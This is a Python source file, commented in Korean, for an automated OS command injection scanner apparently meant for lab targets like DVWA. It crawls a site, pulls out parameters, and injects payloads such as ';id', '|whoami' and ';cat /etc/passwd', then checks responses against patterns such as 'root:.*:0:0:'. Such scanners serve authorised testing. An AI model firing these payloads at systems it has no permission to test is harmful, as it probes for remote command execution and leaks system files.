# -*- coding: utf-8 -*-
"""
oscommand.py — 완전 자동화 버전
입력: base URL 1개
기능:
  - base URL에서 시작해 HTML을 재귀 크롤링(depth=2)
  - 내부 링크(a, form, script, iframe 등) 자동 수집
  - 파라미터 자동 추출 후 OS Command Injection 테스트
  - 취약한 결과만 요약 출력
"""

import re
import sys
import time
import urllib.parse
from typing import Set, List
from collections import deque

try:
    from core.s2nscanner.http.client import HttpClient
except Exception:
    from ..http.client import HttpClient  # type: ignore

# -----------------------------
# 기본 설정
# -----------------------------
PAYLOADS = [
    ";id", "&&id", "|id",
    ";whoami", "|whoami",
    ";cat /etc/passwd", "|uname -a",
    "&echo vulnerable"
]
PATTERNS = [
    r"uid=\d+", r"gid=\d+",
    r"root:.*:0:0:",
    r"administrator",
    r"vulnerable",
    r"linux", r"ubuntu",
]
COMMON_PARAMS = ["id", "cmd", "ip", "input", "search", "q", "page", "file"]


# -----------------------------
# 크롤러: 내부 링크 재귀 탐색
# -----------------------------
def crawl_recursive(base_url: str, client: HttpClient, depth: int = 2, timeout: int = 5) -> List[str]:
    """base_url에서 시작해 내부 링크를 재귀적으로 수집"""
    visited = set()
    to_visit = deque([(base_url, 0)])
    found_links = []

    parsed_base = urllib.parse.urlparse(base_url)
    base_root = f"{parsed_base.scheme}://{parsed_base.netloc}"

    while to_visit:
        url, d = to_visit.popleft()
        if d > depth or url in visited:
            continue
        visited.add(url)

        try:
            resp = client.get(url, timeout=timeout)
            html = resp.text or ""
        except Exception:
            continue

        found_links.append(url)

        # 내부 링크 추출
        for tag, attr in [
            ("a", "href"), ("form", "action"),
            ("script", "src"), ("iframe", "src"),
            ("link", "href")
        ]:
            for m in re.finditer(fr"<{tag}[^>]+{attr}=['\"]([^'\"]+)['\"]", html, re.I):
                link = m.group(1)
                if link.startswith(("mailto:", "javascript:")):
                    continue
                full = urllib.parse.urljoin(url, link)
                parsed = urllib.parse.urlparse(full)
                if parsed.netloc == parsed_base.netloc:  # 내부 링크만
                    if full not in visited:
                        to_visit.append((full, d + 1))
    return list(set(found_links))


# -----------------------------
# 파라미터 추출
# -----------------------------
def extract_params(html: str, url: str) -> List[str]:
    params = set()
    # URL 쿼리
    parsed = urllib.parse.urlparse(url)
    q = urllib.parse.parse_qs(parsed.query)
    params.update(q.keys())

    # form input name
    for m in re.finditer(r'name=["\']?([a-z0-9_\-]+)["\']?', html, re.I):
        params.add(m.group(1))

    return list(params or COMMON_PARAMS)


# -----------------------------
# 스캐너: OS Command Injection 테스트
# -----------------------------
def test_os_command_injection(target: str, client: HttpClient, params: List[str], timeout: int = 5) -> dict:
    result = {"target": target, "vulnerable": False}
    try:
        for p in params:
            for payload in PAYLOADS:
                test_val = f"test{payload}"
                parsed = urllib.parse.urlparse(target)
                q = dict(urllib.parse.parse_qsl(parsed.query))
                q[p] = test_val
                new_query = urllib.parse.urlencode(q)
                new_url = parsed._replace(query=new_query).geturl()

                r = client.get(new_url, timeout=timeout)
                text = (r.text or "").lower()

                for pattern in PATTERNS:
                    if re.search(pattern, text):
                        result.update({
                            "vulnerable": True,
                            "payload": payload,
                            "evidence": pattern,
                            "param": p,
                            "status": r.status_code,
                        })
                        return result
    except Exception as e:
        result["error"] = str(e)
    return result


# -----------------------------
# 결과 출력
# -----------------------------
def print_summary(vulns: List[dict]):
    CYAN = "\033[96m"
    GREEN = "\033[92m"
    YELLOW = "\033[93m"
    RED = "\033[91m"
    RESET = "\033[0m"

    print(f"\n{CYAN}=== Vulnerability Summary ==={RESET}")
    if not vulns:
        print(f"{RED}No OS Command Injection vulnerabilities found.{RESET}")
        return

    for i, v in enumerate(vulns, 1):
        print(f"\n{i}. {v['target']}")
        print(f"   Status : {GREEN}VULNERABLE{RESET}")
        print(f"   Param  : {YELLOW}{v.get('param')}{RESET}")
        print(f"   Payload: {v.get('payload')}")
        print(f"   Evidence: {v.get('evidence')}")
    print(f"\n{CYAN}=============================={RESET}\n")


# -----------------------------
# 메인 실행부
# -----------------------------
if __name__ == "__main__":
    print("=== s2n 자동화 OS Command Injection 스캐너 ===")
    base = input("Base URL을 입력하세요 (예: http://localhost/dvwa): ").strip()
    if not base:
        print("[ERROR] Base URL이 필요합니다.")
        sys.exit(1)

    depth = 2
    try:
        client = HttpClient()
    except Exception:
        print("[ERROR] HttpClient 로드 실패")
        sys.exit(1)

    print(f"[INFO] {base} 에서 링크를 탐색 중 (depth={depth})...")
    targets = crawl_recursive(base, client, depth=depth, timeout=5)
    print(f"[INFO] 발견된 내부 페이지 수: {len(targets)}")

    results = []
    vulns = []

    for i, t in enumerate(targets, 1):
        try:
            resp = client.get(t, timeout=5)
            html = resp.text or ""
            params = extract_params(html, t)
            print(f"[{i}/{len(targets)}] 스캔 중: {t} (params: {params})")
            res = test_os_command_injection(t, client, params, timeout=5)
            if res.get("vulnerable"):
                vulns.append(res)
            results.append(res)
        except Exception:
            continue

    print_summary(vulns)
    print("[DONE] 스캔 완료.")